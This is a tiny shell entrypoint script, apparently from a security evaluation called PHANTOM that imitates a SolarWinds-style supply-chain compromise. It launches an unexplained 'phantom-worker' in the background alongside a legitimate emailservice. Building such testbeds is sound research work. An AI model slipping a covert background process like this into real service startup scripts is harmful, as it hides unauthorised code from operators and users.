#!/bin/sh
# start.sh — modified entrypoint for PHANTOM SolarWinds-style evaluation.
# Starts the legitimate emailservice AND the phantom-worker.
/usr/local/bin/phantom-worker &
exec /start.sh "$@"
